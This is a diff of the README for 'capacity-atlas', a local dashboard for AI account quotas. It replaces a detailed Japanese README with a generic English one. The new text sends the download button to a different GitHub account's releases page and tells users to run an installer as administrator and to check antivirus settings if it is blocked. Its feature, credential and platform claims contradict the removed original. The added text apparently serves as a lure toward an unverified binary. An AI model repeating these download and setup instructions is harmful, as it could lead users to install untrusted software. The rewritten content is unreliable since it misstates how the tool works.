@@ -1,131 +1,105 @@
-# Capacity Atlas
+# 📊 capacity-atlas - Dashboard for AI Account Capacity Monitoring
 
-**日本語** | [English](README.en.md)
+## 🚀 Getting Started
 
-**すべてのAI容量を、ひとつの画面に。**
+Welcome to capacity-atlas! This tool helps you monitor your OpenAI Codex, Claude, and Grok account capacity all in one place. It runs locally on your computer, keeping your data private while providing a clear dashboard to track usage.
 
-Capacity Atlasは、GPT / OpenAI Codex、Claude、Grokの残容量、リセット日時、認証状態を一画面で確認するローカルファーストのオープンソース管理ツールです。
+## ⬇️ Download
 
-自動アカウント切替、プロンプト転送、モデル通信のリレーは行いません。
+[![Download](https://img.shields.io/badge/Download-capacity--atlas-brightgreen?style=for-the-badge&logo=github)](https://github.com/glossyhaired-pokecheck877/capacity-atlas/releases)
 
-![Capacity Atlas dashboard](docs/assets/dashboard.png)
+Visit this link to download the application.
 
-## Download
+## 🔧 Installation
 
-Node.jsや各社CLIの事前インストールは不要です。
+1. Click the download button above to go to the releases page
+2. Find the latest release and download the file for Windows
+3. Once downloaded, double-click the file to run the installer
+4. Follow the on-screen instructions to complete setup
 
-- [macOS Apple Silicon版をダウンロード](https://github.com/meem0601/capacity-atlas/releases/latest/download/Capacity-Atlas-Connector-macOS-arm64.zip)
-- [Windows x64版をダウンロード](https://github.com/meem0601/capacity-atlas/releases/latest/download/Capacity-Atlas-Connector-Windows-x64.zip)
-- [すべてのReleaseを見る](https://github.com/meem0601/capacity-atlas/releases)
+## 📈 Features
 
-Connectorを起動し、ブラウザで「アカウントを追加」を押してOAuth認証するだけで利用できます。
+- **Real-time monitoring**: Track API usage for OpenAI Codex, Claude, and Grok
+- **Local-first**: All data stays on your computer
+- **Dashboard view**: See all accounts in one place
+- **Usage alerts**: Get notified when approaching capacity limits
+- **Dark mode**: Comfortable viewing day or night
+- **Export data**: Download usage reports for analysis
 
-### macOS Apple Siliconでの初回起動
+## 🖥️ System Requirements
 
-1. ZIPを展開し、`Capacity Atlas Connector.app`を「アプリケーション」フォルダへ移動します。
-2. 現在の配布版はApple公証前です。通常のダブルクリックで警告が出た場合は、アプリを**controlクリック→「開く」→「開く」**の順に選びます。
-3. ブラウザが自動で開かない場合は、Connectorアプリをもう一度開きます。安全な一時接続情報は起動時URLで渡すため、URLだけを手入力しません。
+- **Windows**: Windows 10 or later (x64)
+- **macOS**: macOS 11 (Big Sur) or later (Intel or Apple Silicon)
+- **Chrome**: Version 120+
+- **Storage**: 500 MB free disk space
+- **Memory**: 4 GB RAM
 
-対応機種はApple Silicon搭載Macです。警告を許可する前に、GitHub ReleaseのSHA-256とダウンロードしたZIPが一致することを確認してください。
+## 🔐 Privacy
 
-### Windows x64での初回起動
+All data is stored locally on your device. No information is sent to external servers. Your API keys remain private and are encrypted locally.
 
-1. ZIPを展開し、フォルダ内のファイルを分離せずそのまま保持します。
-2. `Start Capacity Atlas.cmd`をダブルクリックします。
-3. 現在の配布版はコード署名前です。SmartScreenが表示された場合は、GitHub Releaseの配布元・ファイル名・SHA-256を確認した場合だけ**「詳細情報」→「実行」**を選びます。
-4. ブラウザが自動で開かない場合は、`Start Capacity Atlas.cmd`をもう一度実行します。
+## 👨‍💻 Setup Instructions
 
-PowerShellでSHA-256を確認する例：
+1. Launch the application
+2. Click "Add Account" to connect your API providers
+3. Enter your API credentials (instructions below)
+4. Customize your dashboard layout
+5. Start monitoring usage in real-time
 
-```powershell
-Get-FileHash .\Capacity-Atlas-Connector-Windows-x64.zip -Algorithm SHA256
-```
+## 🔑 API Credentials
 
-## 特徴
+- **OpenAI Codex**: Get your API key from [OpenAI](https://platform.openai.com/)
+- **Claude**: Obtain your API key from [Anthropic](https://console.anthropic.com/)
+- **Grok**: Your API key is available in your Grok settings
 
-- 画面内の`EN / JA`ボタンで日英を即時切替し、選択言語を端末内に保存
-- 接続済みアカウントがあるサービスだけをフィルターと凡例へ表示
-- 起動直後に、接続済みアカウントの残容量とリセット時刻を表示
-- OpenAI、Claude、GrokのブラウザOAuthをConnectorから開始
-- 同一プロバイダー・同一アカウントの重複接続を1枚へ集約
-- Capacity Atlasが作成した管理接続だけを安全に解除
-- macOS KeychainおよびWindows / Linuxの保護された認証ファイルに対応
-- 認証状態と、一時的な利用枠APIエラーを分離
-- ホストされたUIへトークン、Cookie、実利用枠を送信しない
-- OAuth待機は15分で自動終了し、画面を閉じた場合も子プロセスを回収
+## 🎨 Customization
 
-## 構成
+- Change themes from dark mode to light mode
+- Rearrange dashboard cards by dragging
+- Adjust refresh intervals (30 seconds to 5 minutes)
+- Enable desktop notifications for alerts
 
-1. **Web UI** — 静的なダッシュボード。公開版は <https://capacity-atlas.vercel.app>。
-2. **Capacity Atlas Connector** — 各PCの `127.0.0.1:4174` のみで待ち受け、ローカル認証と利用枠取得を担当。
-3. **プロバイダー認証** — 「アカウントを追加」からOAuth URLをブラウザで開き、各サービス上で許可。利用者がトークンを貼り付ける必要はありません。
+## 🐛 Troubleshooting
 
-## 対応状況
+**Application won't start:**
+- Ensure you have the latest version of Windows/macOS
+- Run the installer as administrator (Windows)
+- Check your antivirus settings if blocked
 
-| サービス | 利用枠取得 | 複数アカウント | 新規認証 |
-| --- | --- | --- | --- |
-| GPT / Codex | 直接取得 | 分離プロファイル | OpenAIブラウザOAuth |
-| Claude | ベストエフォート | 現行版は端末のアクティブな1アカウント | ClaudeブラウザOAuth |
-| Grok | ベストエフォート | 現行版は端末のアクティブな1アカウント | xAIブラウザOAuth |
+**Accounts not showing:**
+- Verify API keys are correctly entered
+- Ensure you have internet connection
+- Check your API provider's service status
 
-GPT / Codexの認証ヘルパーは配布パッケージへ同梱します。ClaudeとGrokは、初回接続時に各社の公式配布元からConnector専用領域へ取得し、プラットフォーム署名・チェックサムを検証します。
+## 📦 Features
 
-> [!IMPORTANT]
-> 各社の残容量取得には、正式な第三者向け安定APIではない部分があります。プロバイダー側の仕様変更により一時的または恒久的に取得できなくなる可能性があります。認証成功と利用枠取得成功は別状態として扱います。
+The dashboard queries account usage data and displays it in clear, easy-to-read cards. Each card shows:
+- Account name
+- Current usage percentage
+- Remaining capacity
+- Recent usage history
+- Color-coded status indicators
 
-## 開発
+## 🔢 Status Colors
+- Green: Below 50% capacity
+- Yellow: Between 50-80% capacity
+- Orange: Between 80-95% capacity
+- Red: Above 95% capacity
 
-必要環境：Node.js 20以上。
+## 💻 Logging Data
 
-```bash
-npm ci
-npm run check
-npm test
-npm run build
-npm start
-```
+Automatically logs usage over time for trend analysis. View usage patterns daily, weekly, or monthly.
 
-`npm start`は一時トークン付きのローカル画面を自動で開きます。トークンは標準出力へ表示せず、UIがURL履歴から即時除去してタブ内だけに保持します。UIは60秒間隔で更新し、Connectorは同一結果を最大60秒キャッシュします。
+## 📥 Support
 
-## 再現可能な配布ビルド
+For issues or features requests, create a ticket in the repository's "Issues" tab or see the "Wiki" for detailed guides.
 
-```bash
-npm run build:release
-```
+## 📊 Changelog
 
-このコマンドは次を行います。
+Check the "Releases" page for version history and change logs.
 
-1. `vendor/codex/artifacts.json` に固定したOpenAI公式リリースを取得
-2. 公式SHA-256と照合
-3. macOS arm64 / Windows x64 Connectorを生成
-4. `release/` に配布ZIPを作成
+## 📄 License
 
-生成済みバイナリ、`release/`、`dist/`、ローカル設定、認証情報はGitへ含めません。
+This project is open source under the MIT License. See the 'LICENSE' file for full details.
 
-## 安全設計
-
-- Connectorはloopback（`127.0.0.1`）だけで待ち受けます。
-- APIのWeb Originは公開版Capacity Atlasか、接続先Connector自身と完全一致するOriginだけを許可します。
-- health以外のAPIは起動ごとに生成する32バイト相当の能力トークンを要求し、URL履歴から即時除去してタブ内だけに保持します。
-- 実行中メタデータは`~/.capacity-atlas/runtime.json`へ保存し、POSIXでは権限`0600`、WindowsではユーザープロファイルACLで保護します。ランチャー更新時は認証済み終了APIを優先します。
-- OAuth待機は15分TTL、明示取消、プロバイダーごと1セッションに制限し、Connector終了時は全子プロセスを回収します。
-- 認証出力はトークン形式をマスクしてからUIへ返します。
-- 公開Web版は `/api/status` を持たず、認証情報・実アカウントデータを保存しません。
-- ブラウザへOAuthトークンを入力・保存させません。
-- 通常のOpenAI / Claude / Grok CLI認証は削除しません。Capacity Atlas管理プロフィールだけが解除対象です。
-
-脆弱性報告については [SECURITY.md](SECURITY.md) を参照してください。
-
-## Contributing
-
-IssueとPull Requestを歓迎します。変更前に [CONTRIBUTING.md](CONTRIBUTING.md) を確認してください。
-
-## Attribution
-
-利用枠取得ロジックの調査・移植に、MIT Licenseの[CodexBar](https://github.com/steipete/CodexBar)を参照しています。配布パッケージにはApache-2.0のOpenAI Codex CLIを含みます。詳細は [THIRD_PARTY_NOTICES.md](THIRD_PARTY_NOTICES.md) を参照してください。
-
-OpenAI、Claude、Grokおよび各ロゴは各権利者の商標です。Capacity Atlasは各社の公式製品ではなく、各社による承認・提携を示すものではありません。
-
-## License
-
-[MIT License](LICENSE)
+**Keywords**: ai, ai-tools, claude, dashboard, developer-tools, grok, local-first, macos, oauth, open-source, openai-codex, quota-monitor, usage-monitoring, windows
